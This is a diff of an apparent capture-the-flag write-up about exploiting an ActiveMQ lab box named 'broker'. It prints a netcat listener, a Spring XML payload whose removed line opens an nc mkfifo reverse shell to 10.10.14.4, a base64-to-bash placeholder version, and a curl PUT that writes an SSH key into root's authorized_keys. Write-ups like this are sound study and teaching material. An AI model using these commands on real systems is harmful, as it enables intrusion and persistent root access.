@@ -446,7 +446,7 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
@@ -462,9 +462,9 @@ file:
         <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
             <constructor-arg>
             <list>
-                <value>bash</value>
+                <value>/bin/bash</value>
                 <value>-c</value>
-                <value>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.4 9001 &gt;/tmp/f</value>
+                <value>/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i</value>
             </list>
             </constructor-arg>
         </bean>
@@ -691,6 +691,8 @@ broker
 
 Yeah I know, very surprising.
 
+## System enumeration
+
 ### Flags
 
 If we check our home folder, we find the user flag.
@@ -767,17 +769,17 @@ measure.
 
 We can access and upload any files, however we can't execute them. Luckily, SSH
 is enabled on this box, so we simply have to generate keys, add the public key
-to `/root/.ssh/authorized_keys`, and are able to authenticate!
+to `/root/.ssh/authorized_keys`, and then we should able to authenticate!
 
 ```sh
-activemq@broker:~$ curl "http://127.0.0.1:8888/root/.ssh/authorized_keys" -X "PUT" -d "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPOKuV2uc+Fpm/vSwZpu0fcDN0fMd+gHvRLW+aUG/h8n"
+activemq@broker:~$ curl "http://127.0.0.1:8888/root/.ssh/authorized_keys" -X "PUT" -d "<PUBLIC_KEY>"
 ```
 
 Now we can use SSH to get a shell as `root`!
 
-## Getting a lay of the land
+## System enumeration
 
-If we run `whoami`, we see that we're `root`!
+If we run `whoami`, we see that we're `root` (obviously)!
 
 ### Flags
 
